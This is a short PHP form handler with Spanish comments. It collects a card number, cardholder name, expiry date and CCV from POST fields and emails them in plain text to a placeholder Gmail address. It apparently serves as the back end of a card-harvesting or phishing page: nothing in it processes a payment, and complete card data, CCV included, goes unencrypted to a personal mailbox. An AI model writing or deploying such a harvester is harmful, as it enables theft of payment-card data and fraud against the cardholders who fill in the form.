<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoge los datos del formulario
    $numeroTarjeta = $_POST['inputNumero'];
    $nombre = $_POST['inputNombre'];
    $mesExpiracion = $_POST['mes'];
    $anoExpiracion = $_POST['year'];
    $ccv = $_POST['inputCCV'];

    // Construye el mensaje de correo electrónico
    $mensaje = "Número de Tarjeta: $numeroTarjeta\n";
    $mensaje .= "Nombre: $nombre\n";
    $mensaje .= "Expiración: $mesExpiracion/$anoExpiracion\n";
    $mensaje .= "CCV: $ccv\n";

    // Envía el correo electrónico
    $para = "tucorreo@gmail.com"; // Cambia esto con tu dirección de correo electrónico
    $titulo = "Nuevo formulario de tarjeta de crédito";
    $cabeceras = "From: formulario@tusitio.com";

    // Envía el correo electrónico
    if (mail($para, $titulo, $mensaje, $cabeceras)) {
        echo "El formulario ha sido enviado con éxito.";
    } else {
        echo "Error al enviar el formulario.";
    }
} else {
    echo "Acceso denegado.";
}
?>

?>

